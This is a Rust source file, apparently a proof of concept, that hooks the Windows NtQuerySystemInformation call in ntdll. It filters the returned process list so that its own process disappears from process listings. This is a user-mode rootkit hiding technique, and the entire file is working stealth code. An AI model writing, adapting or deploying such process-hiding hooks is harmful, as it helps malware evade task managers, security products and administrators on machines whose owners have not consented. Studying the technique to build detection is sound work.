use detour::static_detour;
use std::error::Error;
use std::ffi::CStr;
use std::mem;
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::shared::minwindef::{DWORD, ULONG};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, UNICODE_STRING, STRING};
use winapi::um::winnt::{ACCESS_MASK, PACCESS_MASK};

// Define function signature for NtQuerySystemInformation
type NtQuerySystemInformationFn = unsafe extern "system" fn(
    SystemInformationClass: u32,
    SystemInformation: PVOID,
    SystemInformationLength: ULONG,
    ReturnLength: *mut ULONG,
) -> NTSTATUS;

static_detour! {
    static NtQuerySystemInformationHook: NtQuerySystemInformationFn;
}

// SystemProcessInformation = 5
const SYSTEMS_PROCESS_INFORMATION: u32 = 5;

// Structure for SYSTEM_PROCESS_INFORMATION (simplified)
#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: i64, // LARGE_INTEGER
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: i64,
    UserTime: i64,
    KernelTime: i64,
    ImageName: UNICODE_STRING,
    BasePriority: i32,
    UniqueProcessId: HANDLE,
    InheritedFromUniqueProcessId: HANDLE,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: ULONG_PTR,
    PeakVirtualSize: SIZE_T,
    VirtualSize: SIZE_T,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: SIZE_T,
    WorkingSetSize: SIZE_T,
    QuotaPeakPagedPoolUsage: SIZE_T,
    QuotaPagedPoolUsage: SIZE_T,
    QuotaPeakNonPagedPoolUsage: SIZE_T,
    QuotaNonPagedPoolUsage: SIZE_T,
    PagefileUsage: SIZE_T,
    PeakPagefileUsage: SIZE_T,
    PrivatePageCount: SIZE_T,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
}

use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};

pub fn install_hooks() -> Result<(), Box<dyn Error>> {
    unsafe {
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return Err("Failed to get ntdll handle".into());
        }

        let address = winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            b"NtQuerySystemInformation\0".as_ptr() as *const i8,
        );
        if address.is_null() {
            return Err("Failed to get NtQuerySystemInformation address".into());
        }

        let target: NtQuerySystemInformationFn = mem::transmute(address);

        NtQuerySystemInformationHook
            .initialize(target, nt_query_system_information_detour)?
            .enable()?;
    }
    Ok(())
}

fn get_current_process_id() -> u32 {
    unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() }
}

unsafe extern "system" fn nt_query_system_information_detour(
    system_information_class: u32,
    system_information: PVOID,
    system_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS {
    // Call original function first
    let status = NtQuerySystemInformationHook.call(
        system_information_class,
        system_information,
        system_information_length,
        return_length,
    );

    // Filter results if success and class is SystemProcessInformation
    if status == 0 && system_information_class == SYSTEMS_PROCESS_INFORMATION {
        let my_pid = get_current_process_id() as usize;
        
        let mut current_ptr = system_information as *mut SYSTEM_PROCESS_INFORMATION;
        let mut prev_ptr: *mut SYSTEM_PROCESS_INFORMATION = std::ptr::null_mut();

        loop {
            let current = &mut *current_ptr;
            let current_pid = current.UniqueProcessId as usize;

            if current_pid == my_pid {
                // HIDE: Unlink this entry
                if !prev_ptr.is_null() {
                    let prev = &mut *prev_ptr;
                    if current.NextEntryOffset == 0 {
                        prev.NextEntryOffset = 0; // Last item
                    } else {
                        prev.NextEntryOffset += current.NextEntryOffset;
                    }
                } else {
                    // If it's the first item, we can't easily unlink it without shifting data,
                    // but usually the first process is System/Idle, not us.
                    // For simplicity in this PoC, we skip handling head removal differently.
                }
            } else {
                prev_ptr = current_ptr;
            }

            if current.NextEntryOffset == 0 {
                break;
            }
            current_ptr = (current_ptr as *mut u8).add(current.NextEntryOffset as usize) as *mut SYSTEM_PROCESS_INFORMATION;
        }
    }

    status
}
